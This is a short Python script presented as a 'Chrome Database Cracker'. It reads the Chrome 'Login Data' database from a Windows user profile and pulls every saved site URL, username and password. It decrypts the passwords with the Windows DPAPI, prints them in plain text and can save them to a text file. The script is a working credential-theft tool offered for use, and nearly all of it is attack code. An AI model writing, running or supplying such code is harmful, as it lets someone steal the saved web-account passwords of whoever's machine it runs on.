#imports
import os
import sqlite3
import win32crypt
import time

#fetch data
def fetch_chrome():

    print(''' 

           ==================="""""""""""""""==============================

        \n =============== AH | Chrome Database Cracker v1.1 ==============\n

           ==================="""""""""""""""==============================
          ''')

    time.sleep(3)
    print('Loading ...............................%\n')
    time.sleep(3)
    print('First, Close Chrome if it is running.\n')
    time.sleep(3)
    i = input("Enter Word (fetch) to fetch the Database: ")

    while i != "fetch":
        i = input(" \n ----> invalid input .... re-enter Word (fetch) to fetch the Database: ")

    time.sleep(3)
    print("\nFetching .............%\n")
    time.sleep(3)
    print("\nDB:\n")

    data_path = os.path.expanduser('~') + r'\AppData\Local\Google\Chrome\User Data\Default\Login Data'
    c = sqlite3.connect(data_path)
    cursor = c.cursor()
    select_statement = 'SELECT origin_url, username_value, password_value FROM logins'
    cursor.execute(select_statement)

    login_data = cursor.fetchall()

    cred = {}

    string = ''

    for url, user_name, pwd in login_data:
        pwd = win32crypt.CryptUnprotectData(pwd)
        cred[url] = (user_name, pwd[1].decode('utf8'))
        string += '\n[+] URL:%s USERNAME:%s PASSWORD:%s\n' % (url,user_name,pwd[1].decode('utf8'))
        print(string)

        time.sleep(1)
    p = input('\n\n---->Do you want to export it into text file? (y/n) : ')

    while p != "y" and p != "n":
        p = input(" \n ----> invalid input .... re-enter y or n: ")

    if p == "y":
        print("\n\n Exporting.....%")
        time.sleep(2)
        db = open("Chrome_fetched_DB.txt","w")
        db.write(string)
        time.sleep(2)
        print("\n\n DB Succesfully Exported.\n\n")
        time.sleep(2)
        db.close()
    elif p == "n":
        pass
             
        
    input("\n\npress any key to exit..")


if __name__=='__main__':
    fetch_chrome()
